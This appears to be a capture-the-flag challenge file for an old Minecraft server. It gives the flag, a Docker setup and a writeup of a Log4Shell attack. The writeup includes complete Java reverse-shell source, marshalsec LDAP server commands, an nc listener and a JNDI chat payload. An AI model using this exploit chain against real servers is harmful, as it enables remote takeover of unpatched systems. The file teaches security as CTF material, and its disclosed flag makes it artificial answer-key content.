# Mine

### Description

You wanna play spleef with me on my new Minecraft server?

Flag format: `pctf{}`

### Difficulty

Hard

### Flag

`pctf{whos_joe?_joe_mama_haha_g0ttem}`

### Hints

The Minecraft version is awfully old, I wonder if it has any vulnerabilities.

### Author

Andy Smith

### Tester

### Setup

[https://gmuedu-my.sharepoint.com/:u:/g/personal/asmit22_gmu_edu/Efege-JFC5dNrDKU5bHYeHoBeXGZaUcmJq4mIhCMHUshqw?e=dbdfr4](https://gmuedu-my.sharepoint.com/:u:/g/personal/asmit22_gmu_edu/Efege-JFC5dNrDKU5bHYeHoBeXGZaUcmJq4mIhCMHUshqw?e=dbdfr4)

Requires Docker.

You need to mount two volumes that container the cache and java binary. This was done to save overall space so containers aren't each storing the minecraft jars and java binaries.

For the hosted challenge, the port is 25565 and the volumes JSON string will be:

```json
{"/home/ubuntu/challenges/mine/zulu8.31.0.1-jdk8.0.181-linux_x64": {"bind": "/bin/java", "mode": "ro"}, "/home/ubuntu/challenges/mine/cache": {"bind": "/home/joe/Documents/minecraft/cache", "mode": "ro"}}
```

Example of testing it (will run on a random port):

```bash
sudo docker run --rm -d -p 0.0.0.0::25565 -v /home/andy/mc/zulu8.31.0.1-jdk8.0.181-linux_x64:/bin/java:ro -v /home/andy/mc/cache:/home/joe/Documents/minecraft/cache:ro mc_minecraft
```

### Writeup

You know we had to do a Minecraft log4j challenge. This uses a JNDI chat message to exploit the server.

This solution is going to require a reverse shell, so running on a VPS or other host with a public IP will be ideal.

First step is to try connecting to the server to understand what version it is. This shows that it's 1.16.5. Download Minecraft 1.16.5 and join the server. The server conveniently says that it's running OpenJDK 8u181.

You need to match that same JDK version. A lot of sources seem to have removed their older vulnerable versions, so the best source I found personally was Azul's JDKs. The direct link for 8u181 is [https://cdn.azul.com/zulu/bin/zulu8.31.0.1-jdk8.0.181-linux_x64.tar.gz](https://cdn.azul.com/zulu/bin/zulu8.31.0.1-jdk8.0.181-linux_x64.tar.gz). Extract that on a Linux system.

Then you need to get the marshalsec tool. Run a `git clone https://github.com/mbechler/marshalsec`.

Install maven to build marshalsec. `sudo apt install maven`. The Java version here doesn't matter since maven can build for prior versions.

Then cd into the marshalsec directory and build the jar: `mvn clean package -DskipTests`

Next, you need a payload. The following is a simple reverse shell:

```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="PUT YOUR IP HERE";
        int port=4444;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
```

Save that to `Exploit.java` (it's Java so the filename, class name, and constructor name all need to match).

Compile it with the Java 1.8 you downloaded, e.g. `./zulu8.31.0.1-jdk8.0.181-linux_x64/bin/javac Exploit.java`

That will make a `Exploit.class` file.

Now start an HTTP server so that the JNDI exploit can download the exploit class. `python3 -m http.server`

Run the marshalsec jar and specify your IP, e.g. `./zulu8.31.0.1-jdk8.0.181-linux_x64/bin/java -cp marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:8000/#Exploit"`

This will start the listener. The final prep is to run a netcat listener, such as `nc -lvnp 4444`.

Now, go back to the Minecraft server and send a chat message like `${jndi:ldap://172.17.0.1:1389/Exploit}`. Make sure the IP is yours and the port is the one the marshalsec listener prints when you start it.

This should work and you should get a shell. The current path will be `/home/joe/Documents/minecraft`. Navigate up to the Desktop directory and there will be a flag.txt.
